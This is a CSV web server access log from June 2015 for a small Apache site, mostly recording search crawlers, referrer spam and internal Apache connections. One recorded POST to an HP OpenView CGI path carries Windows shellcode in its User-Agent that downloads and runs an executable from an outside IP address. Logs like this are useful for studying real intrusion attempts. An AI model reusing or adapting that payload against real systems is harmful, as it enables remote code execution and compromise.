"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"31.193.196.98","-","2015-06-20 16:16:50","GMT-0700","GET","/index.php",404,488,"http://tinyurl.com/motofest2015","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
"66.249.79.108","-","2015-06-20 16:18:53","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"104.131.217.202","-","2015-06-20 17:02:30","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )"
"66.249.79.142","-","2015-06-20 19:10:41","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"207.241.225.235","-","2015-06-20 19:43:25","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; archive.org_bot; Wayback Machine Live Record; +http://archive.org/details/archive.org_bot)"
"70.167.8.42","-","2015-06-20 20:01:31","GMT-0700","GET","/robots.txt",200,366,"-","izsearch.com"
"93.170.186.121","-","2015-06-20 20:20:12","GMT-0700","GET","/",200,543,"http://boleznikogi.com/","Opera/8.01 (Windows NT 5.1)"
"93.170.186.121","-","2015-06-20 20:20:22","GMT-0700","GET","/",200,543,"http://boleznikogi.com/","Opera/8.01 (Windows NT 5.1)"
"93.170.186.121","-","2015-06-20 20:20:22","GMT-0700","GET","/",200,543,"http://boleznikogi.com/","Opera/8.01 (Windows NT 5.1)"
"23.29.134.16","-","2015-06-20 21:34:20","GMT-0700","GET","/robots.txt",200,423,"-","python-requests/2.6.2 CPython/2.7.6 Linux/3.13.0-49-generic"
"158.222.15.27","-","2015-06-20 21:36:22","GMT-0700","GET","/ramble/index.php?blogId=39",404,469,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"158.222.15.27","-","2015-06-20 21:36:23","GMT-0700","GET","/",200,565,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"198.12.117.118","-","2015-06-20 21:41:34","GMT-0700","GET","/ramble/index.php?blogId=83",404,469,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"198.12.117.118","-","2015-06-20 21:41:35","GMT-0700","GET","/",200,565,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"157.55.39.211","-","2015-06-20 22:24:20","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"66.249.79.78","-","2015-06-20 22:55:27","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"81.223.254.34","-","2015-06-21 00:38:07","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)"
"61.135.190.103","-","2015-06-21 01:27:15","GMT-0700","GET","/",200,565,"http://www.baidu.com/s?wd=Deletedinode31337haszerodtimeFIXED%21","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
"112.64.235.246","-","2015-06-21 02:48:05","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.0 QQ-Manager Mobile Safari/537.36"
"190.203.82.88","-","2015-06-21 02:52:52","GMT-0700","GET","/",200,527,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"106.120.173.111","-","2015-06-21 04:34:49","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"66.249.69.11","-","2015-06-21 04:50:53","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"198.12.117.118","-","2015-06-21 04:57:39","GMT-0700","GET","/ramble/index.php?blogId=29",404,469,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"198.12.117.118","-","2015-06-21 04:57:40","GMT-0700","GET","/",200,565,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"95.215.9.222","-","2015-06-21 05:06:15","GMT-0700","GET","/",200,562,"-","netscan.lekus.su"
"198.12.117.18","-","2015-06-21 05:08:08","GMT-0700","GET","/ramble/index.php?blogId=99",404,469,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"198.12.117.18","-","2015-06-21 05:08:08","GMT-0700","GET","/",200,565,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36"
"180.225.203.220","-","2015-06-21 05:32:56","GMT-0700","POST","/OvCgi/getnnmdata.exe",404,482,"-","T00WT00W3\xc9d\x8bA0\x8b@\x0c\x8bp\x14\xad\x96\xad\x8bX\x10\x8bS<\x03\xd3\x8bRx\x03\xd3\x8br \x03\xf33\xc9A\xad\x03\xc3\x818GetPu\xf4\x81x\x04rocAu\xeb\x81x\bddreu\xe2\x8br$\x03\xf3f\x8b\x0cNI\x8br\x1c\x03\xf3\x8b\x14\x8e\x03\xd33\xc9Qh.exehdeadSRQharyAhLibrhLoadTS\xff\xd2\x83\xc4\x0cYPQf\xb9llQhon.dhurlmT\xff\xd0\x83\xc4\x10\x8bT$\x043\xc9Qf\xb9eAQ3\xc9hoFilhoadThownlhURLDTP\xff\xd23\xc9\x8dT$$QQR\xebGQ\xff\xd0\x83\xc4\x1c3\xc9Z[SRQhxeca\x88L$\x03hWinETS\xff\xd2j\x05\x8dL$\x18Q\xff\xd0\x83\xc4\x0cZ[hessa\x83l$\x03ahProchExitTS\xff\xd2\xff\xd0\xe8\xb4\xff\xff\xffhttp://66.186.188.227:88/getips.exe"
"157.55.39.95","-","2015-06-21 06:04:54","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-06-21 06:42:05","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
